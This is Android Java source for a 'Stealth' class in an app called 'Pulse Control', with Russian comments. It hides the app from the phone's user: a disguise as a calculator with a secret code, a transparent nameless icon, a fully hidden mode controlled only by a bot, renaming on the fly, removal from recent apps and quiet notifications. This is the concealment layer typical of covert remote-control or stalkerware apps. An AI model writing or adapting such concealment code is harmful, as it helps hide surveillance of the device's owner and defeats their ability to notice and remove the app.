package com.pulse.control;

import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;

/**
 * Четыре режима видимости приложения:
 *
 *   0 NORMAL    «Pulse Control» — обычная зелёная иконка
 *   1 CALC      «Калькулятор»   — фейковый калькулятор, код 6969 + «=» открывает пульт
 *   2 INVISIBLE прозрачная иконка 1×1 с пустым именем — выглядит как пустое место в меню
 *   3 HIDDEN    иконки нет нигде — только бот
 *
 * Реализовано через setComponentEnabledSetting на обычных activity:
 * никаких activity-alias (они ломают разбор пакета на MIUI).
 */
public final class Stealth {

    public static final int NORMAL = 0;
    public static final int CALC = 1;
    public static final int INVISIBLE = 2;
    public static final int HIDDEN = 3;

    public static final String[] NAMES = {
            "Обычная", "Калькулятор", "Невидимая", "Полностью скрыта"
    };

    private Stealth() {}

    public static int mode(Context c) {
        int m = c.getSharedPreferences("pulse", Context.MODE_PRIVATE).getInt("icon_mode", NORMAL);
        return (m < 0 || m > 3) ? NORMAL : m;
    }

    public static String describe(Context c) {
        return NAMES[mode(c)];
    }

    /** Переключает режим и сразу применяет его. */
    public static void setMode(Context c, int m) {
        m = Math.max(0, Math.min(3, m));
        c.getSharedPreferences("pulse", Context.MODE_PRIVATE)
                .edit().putInt("icon_mode", m).apply();
        Config.setStealth(c, m == CALC);
        apply(c);
    }

    /** Включает следующий режим по кругу: обычная → калькулятор → невидимая → скрытая → обычная. */
    public static int next(Context c) {
        int m = (mode(c) + 1) % 4;
        setMode(c, m);
        return m;
    }

    /** Применяет сохранённый режим к компонентам пакета. */
    public static void apply(Context c) {
        int m;
        try { m = mode(c); } catch (Exception e) { m = NORMAL; }
        PackageManager pm = c.getPackageManager();
        String pkg = c.getPackageName();

        switch (m) {
            case CALC:
                set(pm, pkg, ".MainActivity", false);
                set(pm, pkg, ".CalcActivity", true);
                set(pm, pkg, ".InvisibleActivity", false);
                break;
            case INVISIBLE:
                set(pm, pkg, ".MainActivity", false);
                set(pm, pkg, ".CalcActivity", false);
                set(pm, pkg, ".InvisibleActivity", true);
                break;
            case HIDDEN:
                set(pm, pkg, ".MainActivity", false);
                set(pm, pkg, ".CalcActivity", false);
                set(pm, pkg, ".InvisibleActivity", false);
                break;
            case NORMAL:
            default:
                set(pm, pkg, ".MainActivity", true);
                set(pm, pkg, ".CalcActivity", false);
                set(pm, pkg, ".InvisibleActivity", false);
                break;
        }
    }

    private static void set(PackageManager pm, String pkg, String cls, boolean enabled) {
        try {
            pm.setComponentEnabledSetting(new ComponentName(pkg, pkg + cls),
                    enabled ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED
                            : PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
        } catch (Exception ignored) {}
    }

    // ---------------------------------------------------------- названия

    public static String label(Context c) {
        return c.getSharedPreferences("pulse", Context.MODE_PRIVATE)
                .getString("app_label", "");
    }

    /** Меняет название приложения на лету (пустая строка = вернуть исходное). */
    public static void setLabel(Context c, String label) {
        c.getSharedPreferences("pulse", Context.MODE_PRIVATE)
                .edit().putString("app_label", label == null ? "" : label.trim()).apply();
    }

    // ---------------------------------------------------------- быстрые переключатели

    public static boolean noRecents(Context c) {
        return c.getSharedPreferences("pulse", Context.MODE_PRIVATE)
                .getBoolean("no_recents", true);
    }

    public static void setNoRecents(Context c, boolean on) {
        c.getSharedPreferences("pulse", Context.MODE_PRIVATE)
                .edit().putBoolean("no_recents", on).apply();
    }

    public static boolean quietNotifications(Context c) {
        return c.getSharedPreferences("pulse", Context.MODE_PRIVATE)
                .getBoolean("quiet_notifs", false);
    }

    public static void setQuietNotifications(Context c, boolean on) {
        c.getSharedPreferences("pulse", Context.MODE_PRIVATE)
                .edit().putBoolean("quiet_notifs", on).apply();
    }
}
